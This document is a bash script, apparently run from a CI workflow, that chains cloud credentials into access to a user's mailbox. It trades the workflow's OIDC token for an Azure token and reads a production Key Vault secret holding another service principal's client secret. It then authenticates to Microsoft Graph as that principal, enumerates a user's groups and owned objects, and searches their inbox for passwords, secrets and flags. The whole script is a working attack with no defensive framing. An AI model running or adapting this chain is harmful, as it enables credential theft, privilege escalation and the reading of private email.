#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
B=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
S=$(curl -sS --max-time 20 -H "Authorization: Bearer $B" "$PROD/secrets/directory-audit-principal?api-version=7.4")
A=$(echo "$S"|jq -r '.value|fromjson|.appId // empty'); P=$(echo "$S"|jq -r '.value|fromjson|.clientSecret // empty'); TT=$(echo "$S"|jq -r '.value|fromjson|.tenantId // empty')
GT=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" -d 'scope=https://graph.microsoft.com/.default' | jq -r '.access_token // empty')
say "GRAPH=$([[ -n "$GT" ]] && echo OK || echo FAIL)"; [[ -n "$GT" ]] || exit 0
OID='d2cdf247-9319-40cb-8324-5a005ef538da'
for path in "users/$OID?\$select=displayName,userPrincipalName,mail,id" "users/$OID/memberOf?\$select=displayName,id" "users/$OID/ownedObjects?\$select=displayName,id" "groups/$OID?\$select=displayName,id"; do
  say "=== $path"; code=$(curl -sS --max-time 20 -o /tmp/g -w '%{http_code}' -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/$path"); say "HTTP=$code"; head -c 1200 /tmp/g; echo
done
say '=== INBOX SEARCH ==='
curl -sS --max-time 25 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/users/$OID/messages?\$top=50&\$select=subject,bodyPreview,from,receivedDateTime" -o /tmp/mail
jq -r '.value[]? | [.receivedDateTime,.from.emailAddress.address,.subject,.bodyPreview] | @tsv' /tmp/mail 2>/dev/null | grep -aiE 'DF26|flag|password|secret|credential|vault' | head -20
say DONE
